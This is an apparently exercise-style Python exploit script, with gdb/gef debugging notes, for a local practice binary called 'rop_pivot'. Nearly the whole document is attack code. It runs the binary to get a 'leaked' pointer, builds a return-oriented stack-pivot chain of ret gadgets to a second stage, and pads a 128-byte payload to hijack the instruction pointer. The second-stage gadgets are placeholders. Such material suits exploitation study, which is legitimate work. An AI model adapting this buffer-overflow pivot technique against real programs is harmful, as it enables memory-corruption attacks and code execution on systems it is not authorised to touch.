'''

b * 0x080485fc
b * 0x080485f8
r 36 134514168 <<< $(python sploit.py)

gef> search-pattern "\\xCD\\x80\\xC3"
[+] Searching '\xCD\x80\xC3' in memory
[+] In '/lib/i386-linux-gnu/ld-2.19.so'(0xb7fde000-0xb7ffe000), permission=r-x
  0xb7fdf0b0 - 0xb7fdf0bc ->  "\xCD\x80\xC3[...]" 
  0xb7ff5a85 - 0xb7ff5a91 ->  "\xCD\x80\xC3[...]" 
gef> disassemble 0xb7fdf0bc
No function contains specified address.
gef> disassemble 0xb7fdf0b0
Dump of assembler code for function _dl_sysinfo_int80:
   0xb7fdf0b0 <+0>:	int    0x80
   0xb7fdf0b2 <+2>:	ret    
End of assembler dump.

'''

import os
import sys
import struct

def payload_chain():

  rop_gadgets = [
    0x45454545,
    0x45454545,
  ]

  return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

def pivot_chain(base):
  ret_addr = int(base, 16) - 324

  sys.stderr.write("[*] Got \"leaked\" ptr at: %s\n" % base)
  sys.stderr.write("[+] Second stage chain at: %s\n" % hex(ret_addr))

  rop_gadgets = [
    0x080485fc, # ret
    0x080485fc, # ret
    0x080485fc, # ret
    0x080485fc, # ret
    0x080485fc, # ret
    0x080485fc, # ret
    ret_addr,   # <address of second chain>
    0x42424242, # align
    0x42424242, # align
  ]
  return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

def leak_addr():
  # not really a leak but.. yeah
  cmd = "echo -ne 'AAA\n' | ./rop_pivot 38 1"
  r = os.popen(cmd).read()
  addr = r.split(' ')[1]

  return addr

def exploit(base_addr):
  # we need 128 bytes to trigger the overwrite which is then performed
  # via CLI: r 36 134514168, EIP -> 0x080485f8
  rop_chain2 = pivot_chain(base_addr)
  rop_chain1 = payload_chain()
  payload  = rop_chain1

  payload += "A" * (128-len(rop_chain1)-len(rop_chain2))

  payload += rop_chain2

  if (len(payload) < 128):
    while (len(payload) < 128):
      payload += "A"

  payload += '\n'

  sys.stderr.write("[*] Final payload length: %d\n" % (len(payload)))
  sys.stdout.write(payload)

def main():
  base = leak_addr()
  exploit(base)

main()

